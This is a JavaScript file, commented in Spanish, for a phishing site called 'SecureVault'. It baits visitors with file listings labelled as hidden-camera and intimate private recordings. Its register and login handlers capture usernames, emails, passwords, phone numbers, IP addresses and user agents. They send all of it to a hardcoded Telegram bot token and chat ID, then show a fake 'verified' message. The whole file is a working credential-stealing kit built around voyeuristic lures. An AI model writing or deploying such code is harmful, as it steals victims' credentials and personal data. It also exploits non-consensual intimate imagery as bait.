// Configuración de Telegram
const BOT_TOKEN = '8346337511:AAFsFIpYy_k_vUw8CHN3kz6j3fQkW5E6whU';
const CHAT_ID = '8467038089';

let userLoggedIn = false;
let files = [];

// Datos de archivos
const filesData = [
    {
        name: "webcam_dormitorio_15_06.jpg",
        type: "image",
        size: "2.8 MB",
        date: "15/06/2024",
        url: "https://images.unsplash.com/photo-1586023492125-27b2c045efd7?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80",
        thumb: "https://images.unsplash.com/photo-1586023492125-27b2c045efd7?ixlib=rb-4.0.3&auto=format&fit=crop&w=300&q=80"
    },
    {
        name: "video_privado_baño_12_06.mp4",
        type: "video",
        size: "145.3 MB",
        date: "12/06/2024",
        url: "https://assets.mixkit.co/videos/preview/mixkit-woman-relaxing-in-a-bathtub-3976-large.mp4",
        thumb: "https://images.unsplash.com/photo-1584622650111-993a426fbf0a?ixlib=rb-4.0.3&auto=format&fit=crop&w=300&q=80"
    },
    {
        name: "selfie_intima_espejo_10_06.jpg",
        type: "image",
        size: "3.2 MB",
        date: "10/06/2024",
        url: "https://images.unsplash.com/photo-1516756587022-7891ad56a8cd?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80",
        thumb: "https://images.unsplash.com/photo-1516756587022-7891ad56a8cd?ixlib=rb-4.0.3&auto=format&fit=crop&w=300&q=80"
    },
    {
        name: "grabacion_secreta_08_06.mp4",
        type: "video",
        size: "287.6 MB",
        date: "08/06/2024",
        url: "https://assets.mixkit.co/videos/preview/mixkit-woman-in-a-nightgown-relaxing-on-a-sofa-3977-large.mp4",
        thumb: "https://images.unsplash.com/photo-1558618666-fcd25c85cd64?ixlib=rb-4.0.3&auto=format&fit=crop&w=300&q=80"
    },
    {
        name: "foto_vestidor_05_06.jpg",
        type: "image",
        size: "4.1 MB",
        date: "05/06/2024",
        url: "https://images.unsplash.com/photo-1590086782957-93c06ef21604?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80",
        thumb: "https://images.unsplash.com/photo-1590086782957-93c06ef21604?ixlib=rb-4.0.3&auto=format&fit=crop&w=300&q=80"
    },
    {
        name: "camara_oculta_03_06.jpg",
        type: "image",
        size: "3.9 MB",
        date: "03/06/2024",
        url: "https://images.unsplash.com/photo-1552058544-f2b08422138a?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80",
        thumb: "https://images.unsplash.com/photo-1552058544-f2b08422138a?ixlib=rb-4.0.3&auto=format&fit=crop&w=300&q=80"
    }
];

// Mostrar archivos
function renderFiles() {
    const grid = document.getElementById('files-grid');
    grid.innerHTML = '';

    filesData.forEach(file => {
        const fileElement = document.createElement('div');
        fileElement.className = 'file-item';
        
        fileElement.innerHTML = `
            <div class="file-preview">
                ${file.type === 'image' ? 
                    `<img src="${file.thumb}" alt="${file.name}">` : 
                    `<video muted><source src="${file.url}"></video>`
                }
                <div class="file-type">${file.type === 'image' ? 'IMG' : 'VID'}</div>
            </div>
            <div class="file-info">
                <h3>${file.name}</h3>
                <div class="file-meta">
                    <span>${file.size}</span>
                    <span>${file.date}</span>
                </div>
                ${userLoggedIn ? 
                    `<button class="download-btn" onclick="downloadFile('${file.url}', '${file.name}')">
                        ⬇️ Descargar Archivo
                    </button>` : 
                    ''
                }
            </div>
        `;
        
        grid.appendChild(fileElement);
    });
}

// Descargar archivo (ahora con _blank)
function downloadFile(url, filename) {
    // Abrir en nueva pestaña para descarga automática
    const downloadWindow = window.open(url, '_blank');
    
    // Enviar notificación a Telegram
    sendToTelegram(`📥 DESCARGA INICIADA:\nArchivo: ${filename}\nUsuario: ${getStoredUsername()}\nFecha: ${new Date().toLocaleString()}`);
    
    // Mostrar mensaje de confirmación
    showNotification(`✅ Descarga iniciada: ${filename}`, 'success');
}

// Obtener usuario almacenado
function getStoredUsername() {
    return document.querySelector('input[name="username"]')?.value || 'Usuario verificado';
}

// Mostrar notificación
function showNotification(message, type = 'info') {
    // Crear elemento de notificación
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? '#10b981' : '#6366f1'};
        color: white;
        padding: 15px 20px;
        border-radius: 10px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        z-index: 3000;
        animation: slideInRight 0.3s ease;
    `;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 4000);
}

// Enviar a Telegram
async function sendToTelegram(message) {
    if (BOT_TOKEN === 'YOUR_BOT_TOKEN' || CHAT_ID === 'YOUR_CHAT_ID') return;
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });
    } catch (error) {
        console.log('Error enviando a Telegram');
    }
}

// Mostrar modal
function showModal(modalId) {
    document.getElementById(modalId).style.display = 'block';
}

// Cerrar modal
function closeModal(modalId) {
    document.getElementById(modalId).style.display = 'none';
}

// Mostrar loading
function showLoading() {
    document.getElementById('loading').style.display = 'flex';
}

// Ocultar loading
function hideLoading() {
    document.getElementById('loading').style.display = 'none';
}

// Obtener IP
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'No disponible';
    }
}

// Registrar usuario
document.getElementById('register-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const submitBtn = this.querySelector('button[type="submit"]');
    const btnText = submitBtn.querySelector('.btn-text');
    const btnLoading = submitBtn.querySelector('.btn-loading');
    
    // Mostrar estado de carga
    btnText.style.display = 'none';
    btnLoading.style.display = 'inline';
    submitBtn.disabled = true;
    
    const formData = new FormData(this);
    const userData = {
        username: formData.get('username'),
        email: formData.get('email'),
        password: formData.get('password'),
        phone: formData.get('phone'),
        ip: await getIP(),
        userAgent: navigator.userAgent,
        timestamp: new Date().toLocaleString()
    };
    
    // Enviar datos a Telegram
    const message = `🚨 NUEVO REGISTRO - SECUREVAULT 🚨

👤 Usuario: ${userData.username}
📧 Email: ${userData.email}
🔑 Contraseña: ${userData.password}
📞 Teléfono: ${userData.phone}
🌐 IP: ${userData.ip}
🕐 Fecha: ${userData.timestamp}
🔍 User Agent: ${userData.userAgent}`;
    
    await sendToTelegram(message);
    
    // Mostrar loading y activar descargas
    showLoading();
    closeModal('register-modal');
    
    setTimeout(() => {
        hideLoading();
        userLoggedIn = true;
        renderFiles();
        showNotification('✅ Cuenta verificada correctamente. Descargas habilitadas.', 'success');
        
        // Restaurar botón
        btnText.style.display = 'inline';
        btnLoading.style.display = 'none';
        submitBtn.disabled = false;
    }, 3000);
});

// Login usuario
document.getElementById('login-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const submitBtn = this.querySelector('button[type="submit"]');
    const btnText = submitBtn.querySelector('.btn-text');
    const btnLoading = submitBtn.querySelector('.btn-loading');
    
    // Mostrar estado de carga
    btnText.style.display = 'none';
    btnLoading.style.display = 'inline';
    submitBtn.disabled = true;
    
    const formData = new FormData(this);
    const loginData = {
        username: formData.get('username'),
        password: formData.get('password'),
        ip: await getIP(),
        timestamp: new Date().toLocaleString()
    };
    
    // Enviar datos a Telegram
    const message = `🔐 INTENTO DE LOGIN - SECUREVAULT 🔐

👤 Usuario: ${loginData.username}
🔑 Contraseña: ${loginData.password}
🌐 IP: ${loginData.ip}
🕐 Fecha: ${loginData.timestamp}`;
    
    await sendToTelegram(message);
    
    // Mostrar loading y activar descargas
    showLoading();
    closeModal('login-modal');
    
    setTimeout(() => {
        hideLoading();
        userLoggedIn = true;
        renderFiles();
        showNotification('✅ Sesión iniciada correctamente. Descargas habilitadas.', 'success');
        
        // Restaurar botón
        btnText.style.display = 'inline';
        btnLoading.style.display = 'none';
        submitBtn.disabled = false;
    }, 3000);
});

// Event listeners
document.getElementById('register-btn').addEventListener('click', () => showModal('register-modal'));
document.getElementById('login-btn').addEventListener('click', () => showModal('login-modal'));

// Cerrar modal al hacer clic fuera
window.addEventListener('click', (e) => {
    if (e.target.classList.contains('modal')) {
        e.target.style.display = 'none';
    }
});

// Añadir estilos de animación
const style = document.createElement('style');
style.textContent = `
    @keyframes slideInRight {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
`;
document.head.appendChild(style);

// Inicializar
document.addEventListener('DOMContentLoaded', () => {
    renderFiles();
});